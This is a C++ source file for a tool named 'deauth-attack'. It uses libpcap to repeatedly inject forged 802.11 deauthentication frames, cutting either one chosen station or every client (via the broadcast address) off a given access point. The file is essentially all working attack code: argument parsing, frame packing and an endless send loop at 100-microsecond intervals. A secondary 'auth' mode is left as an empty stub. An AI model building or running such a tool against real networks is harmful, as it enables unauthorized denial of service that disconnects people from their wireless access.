#include <cstdio>
#include <cstring>
#include <cstdlib>
#include <pcap.h>
#include <unistd.h>
#include <stddef.h>
#include "wireless.h"
#include "frame.h"

#define DEAUTH_FRAME_SIZE 38

void usage() {
    printf("syntax : deauth-attack <interface> <ap mac> [<station mac>] [-auth]\n");
    printf("sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
}

struct Param {
    char* interface_;
    char* ap_mac_;
    char* station_mac_;
    bool unicast;
    bool auth;
};

Param param { .interface_= NULL, .ap_mac_= NULL, .station_mac_ = NULL, .unicast = false, .auth = false };

bool parse(Param* param, int argc, char* argv[]) {
    if (argc < 3)
        return false;

    param->interface_ = argv[1];
    param->ap_mac_ = argv[2];
    if (argc >= 4) {
        param->unicast = true;
        param->station_mac_ = argv[3];
        puts("station set");
    }
    if (argc >= 5 && !strcmp("-auth", argv[4])) {
        param->auth = true;
    }

    return true;
}

int main(int argc, char *argv[])
{
    if (!parse(&param, argc, argv)) {
        usage();
        return -1;
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(param.interface_, BUFSIZ, 1, 1000, errbuf);
    if (pcap == NULL) {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.interface_, errbuf);
        return -1;
    }

    if (param.auth) {
        /* To Do */
        /* auth-attack does not work */
    }

    else {
        Frame frame;
        frame.radio.it_len = 8;
        frame.pack_ap(param.ap_mac_);

        /* disconnect specific device from AP */
        if(param.unicast)
            frame.pack_station(param.station_mac_);
        /* disconnect all devices from AP (broadcast) */
        else
            frame.pack_station((char*)"ff:ff:ff:ff:ff:ff");

        while (true) {
            puts("sending deauth packet ... ");
            pcap_sendpacket(pcap, (const u_char*)(&frame), DEAUTH_FRAME_SIZE);
            usleep(100);
        }
    }
    pcap_close(pcap);

    return 0;
}
